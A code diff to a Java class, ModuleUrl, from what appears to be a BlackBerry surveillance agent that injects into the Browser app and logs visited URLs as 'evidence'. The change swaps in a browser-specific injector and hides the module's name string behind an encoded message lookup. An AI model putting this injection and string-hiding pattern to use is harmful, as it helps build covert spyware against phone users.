@@ -15,15 +15,16 @@ import java.util.Vector;
 import net.rim.device.api.system.Backlight;
 import blackberry.AppListener;
 import blackberry.Device;
+import blackberry.Messages;
 import blackberry.config.ConfModule;
 import blackberry.debug.Debug;
 import blackberry.debug.DebugLevel;
 import blackberry.evidence.Evidence;
 import blackberry.evidence.EvidenceType;
-import blackberry.injection.AppInjector;
 import blackberry.interfaces.ApplicationObserver;
 import blackberry.interfaces.BacklightObserver;
 import blackberry.manager.ModuleManager;
+import blackberry.module.url.AppInjectorBrowser;
 import blackberry.utils.DateTime;
 import blackberry.utils.Utils;
 import blackberry.utils.WChar;
@@ -39,7 +40,7 @@ public final class ModuleUrl extends BaseModule implements ApplicationObserver,
 
     String appName = "Browser";
 
-    AppInjector appInjector;
+    AppInjectorBrowser appInjector;
 
     private boolean seen = true;
     private boolean unsupported = false;
@@ -47,7 +48,7 @@ public final class ModuleUrl extends BaseModule implements ApplicationObserver,
     private static final long APP_TIMER_PERIOD = 5000;
 
     public static String getStaticType() {
-        return "url";
+        return Messages.getString("1f.0");//"url";
     }
 
     public static ModuleUrl getInstance() {
@@ -81,7 +82,7 @@ public final class ModuleUrl extends BaseModule implements ApplicationObserver,
         AppListener.getInstance().addBacklightObserver(this);
 
         try {
-            appInjector = new AppInjector(AppInjector.APP_BROWSER);
+            appInjector = AppInjectorBrowser.getInstance();
 
         } catch (Exception ex) {
             //#ifdef DEBUG
